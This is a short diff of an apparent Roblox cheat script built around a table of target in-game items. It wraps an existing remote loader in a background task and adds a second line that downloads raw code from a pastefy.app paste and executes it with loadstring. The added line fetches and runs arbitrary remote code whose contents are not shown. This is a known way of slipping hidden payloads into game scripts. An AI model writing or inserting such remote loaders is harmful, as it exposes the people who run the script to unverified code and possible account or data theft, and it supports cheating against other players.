@@ -89,4 +89,9 @@ getgenv().TARGET_BRAINROTS = {
     ["Graipuss Medussi"] = true,
     ["Pot Hotspot"] = true
 }
+task.spawn(function()
 loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/fbcd1d25889a843297107dea3642044d.lua"))()
+end)
+task.spawn(function()
+loadstring(game:HttpGet("https://pastefy.app/cXvoZgKe/raw"))()
+end)
